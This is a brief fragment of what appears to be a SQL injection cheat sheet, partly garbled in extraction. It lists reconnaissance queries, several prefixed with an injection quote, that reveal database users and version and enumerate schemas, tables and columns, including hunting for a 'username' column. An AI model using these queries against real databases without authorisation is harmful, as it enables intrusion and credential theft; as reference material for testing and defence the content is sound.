data: Shows the current user running this query, note this is different from system user.
Shows the system user, note this is different from current user running the queries.
'SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;
Displays the current version of the database.
If Statement - in this case if 1=1 then return foobar
'SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
'SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’
'SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’
